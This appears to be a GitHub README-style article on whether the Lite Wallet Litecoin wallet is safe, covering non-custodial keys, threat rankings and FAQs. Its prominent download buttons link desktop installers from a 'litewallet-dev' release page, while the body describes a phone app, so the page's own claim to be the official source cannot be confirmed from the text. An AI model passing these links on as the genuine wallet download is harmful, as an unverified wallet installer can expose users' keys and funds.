![Lite Wallet](assets/banner-article.png)

# Is Lite Wallet safe to use?

The custody model, the claims worth checking, and the ones that are only marketing.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet is non-custodial: the keys live on your device and nobody else can move the coins. That makes it safe against a company failing or freezing an account, and unsafe against your own device being compromised. The honest answer to "is it safe" is that the wallet's model is sound and the risk sits where you keep the twelve words.

## What non-custodial means in practice

There is no account on our side, no login and no server that holds a balance. The wallet derives your addresses from a twelve-word paper key stored on the device and signs transactions locally. We cannot freeze a balance, cannot reverse a send, and cannot restore a wallet for you.

| Question | Custodial wallet | Lite Wallet |
|---|---|---|
| who holds the keys | the company | you, on your device |
| account freeze possible | yes | no, there is nothing to freeze |
| company failure | funds at risk | no effect on your coins |
| forgotten password | support resets it | no password exists; the paper key is the wallet |
| who can move coins | the company, on request | only whoever holds the phrase |

The trade is clear and worth stating plainly: you give up the ability to call someone for help, and you gain the ability to hold coins without permission. [The no-login explainer](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/why-litewallet-has-no-login.md) is the same point from the account side.

## Does Lite Wallet hold my coins?

No. The coins are on the Litecoin blockchain at addresses only your device can spend from. The app holds a key, not a balance: the number you see is read from the chain, and if the chain says the coins are at your address, they are there whether or not the app is running.

This is why uninstalling the app destroys nothing. It deletes the key from that device, which is why the paper key matters, but it does not touch the coins.

## The realistic threats, ranked

1. **Your phrase leaking.** A typed, photographed or pasted paper key hands the wallet over with no further check. This is the dominant loss vector and the only one worth losing sleep over.
2. **A cloned app.** A look-alike download can present a working wallet while sending your words elsewhere. Verify the download; see *the download verification guide*.
3. **A compromised device.** Malware that reads the app's storage can reach the key. A clean device, current OS and no sideloaded builds are the defence.
4. **Phishing support.** Someone offering to "validate" your wallet is stealing it. See *the scam-check guide*.
5. **User error.** Sending to a wrong address, or to a chain that is not Litecoin, is irreversible by design.

Note what is absent: exchange failure, account suspension and withdrawal limits. Those risks belong to custodial services, not to this wallet.

## Can a wallet be hacked?

A well-run non-custodial wallet is not broken into remotely; there is no server to breach. Attacks target the surroundings instead: malware on the device, a copy of the phrase in cloud storage, a fake app, or a person convinced to hand the words over.

Two sub-questions come up constantly and deserve direct answers. Can someone steal coins with your address alone? No - an address is a destination, not a key; publishing it is safe and normal. Can a phone wallet be hacked? A phone with malware, a jailbroken OS or a sideloaded clone can be, which is why the current release from the official source matters more than any feature comparison.

## Which wallet is the safest?

The safest wallet is the one whose key you control, on a device you keep clean, with a backup you have actually verified. That description fits several products, including this one; it fits no custodial app, however polished.

For most people the ranking is: a hardware wallet for large holdings, a phone wallet for spending money, and an exchange only for what you are actively trading. Lite Wallet sits in the second slot, and [the hardware wallet pairing guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/connect-ledger-trezor-to-litewallet.md) covers the first.

| Holding | Sensible setup |
|---|---|
| spending money | phone wallet, small balance |
| savings | hardware wallet, key offline |
| trading float | exchange, withdrawn promptly |
| anything at all | paper key written down and verified |

## Is it safe on iPhone and Android?

Yes, with the usual platform caveats. Both builds are the same wallet: non-custodial, locally signed, with the paper key behind the app's PIN.

The differences that matter are practical. Android allows sideloaded APKs, so a fake build is easier to install by mistake; install only from the official store listing or a verified file. iPhone users face fewer clone risks but more temptation to store the phrase in Notes or Photos, which syncs it to a cloud account - the exact exposure the paper key exists to avoid.

## What "safe" cannot mean

No wallet can protect coins from an owner who gives away the phrase, and none can reverse a confirmed transaction. Lite Wallet has no recovery service, no support override and no way to un-send. That is the cost of holding keys, and it applies equally to every non-custodial wallet on the market.

Judged on that standard, the wallet's design is conventional and sound: standard BIP-39 backup, local signing, no accounts, no server-side key material. There is no server-side key store to breach, because the servers never hold a key. *The licence and source guide* covers the open licence and source, and [the browser extension note](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/litewallet-browser-extension-status.md) explains why there is no extension to phish.

## FAQ

### Is Lite Wallet non-custodial?

Yes. Keys are generated and stored on your device, transactions are signed locally, and no server holds a copy of the key or a balance.

### Does Lite Wallet hold my coins?

No. Coins sit on the Litecoin blockchain at your addresses. The app holds the key that can spend them.

### Can someone steal my coins with my wallet address?

No. An address is public by design and cannot be used to spend. Only the paper key can move funds, so the address is safe to share and the phrase never is.

### Can a mobile wallet be hacked?

A phone wallet can be compromised if the device has malware or the app is a sideloaded clone. Keep the OS current, install from the official source and never type the phrase into anything but the app.

### Which is the safest wallet for Android?

Any non-custodial wallet installed from its official listing, on a device with a current OS and no sideloaded builds. For this wallet, that means the official app with the paper key stored offline.

Security behaviour is unchanged in the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
